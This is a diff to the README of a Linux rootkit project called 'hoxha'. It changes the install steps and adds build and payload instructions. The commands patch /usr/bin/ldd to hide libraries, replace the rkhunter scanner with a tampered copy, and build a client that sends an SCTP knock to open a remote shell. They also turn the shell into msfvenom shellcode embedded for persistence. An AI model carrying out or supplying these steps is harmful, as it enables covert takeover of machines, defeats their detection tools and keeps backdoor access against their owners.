@@ -9,23 +9,15 @@ You can download this like so:
 ```
 git clone https://github.com/mephistolist/hoxha.git
 ```
-You can run this to ensure all dependencies are found:
+Then you can install the rootkit this:
 ```
-cd hoxha; chmod +x ./configure; ./configure
-upx was found...
-SCTP was found...
-sstrip was found...
-Configuration successful!
+cd hoxha/persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
 ```
-Initially this was built on Debian which has a python binary of 'python3'. If your distro uses 'python' or another name you can use something like this to complete the configuration:
+On another device you can build the client with the following in the hoxha root directory:
 ```
-sed -i 's/python3/python/g' persistance/libexec.c
+cc client.c -o client -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 --no-data-sections -falign-jumps=1 -falign-labels=1 -flto -fipa-icf -z execstack -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code -lsctp
 ```
-Then you can build and install it like this:
-```
-make install clean && cd persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
-```
-You can use the client with the destionation ip address where this rootkit is installed:
+The client can be used with just the destionation ip address where this rootkit is installed:
 ```
 # ./client 127.0.0.1
 [+] SCTP knock sequence sent.
@@ -37,4 +29,14 @@ As SCTP ports are hard to close, I would suggest running this to exit the shell:
 ```
 killall -9 hoxha && service cron restart
 ```
-This will ensure that only one port is left listening for future connections. 
+This will ensure that only one port is left listening for future connections.
+
+If you wish to edit or just build the shell from source you can do so by just typing 'make' the root directory. Using 'make install' will give a binary at /usr/bin/hoxha. You can then run this with msfvenom:
+```
+msfvenom -p linux/x64/exec CMD=/usr/bin/hoxha -f raw -o shellcode.bin -b "\x00\x0a\x0d"
+```
+Then you can base64 the raw data like so:
+```
+cat shellcode.bin | base64
+```
+Add that base64 encoded string to the hoxha/persistance/libexec.c file and re-run the Makefile in the persistance folder and your changes should be running.
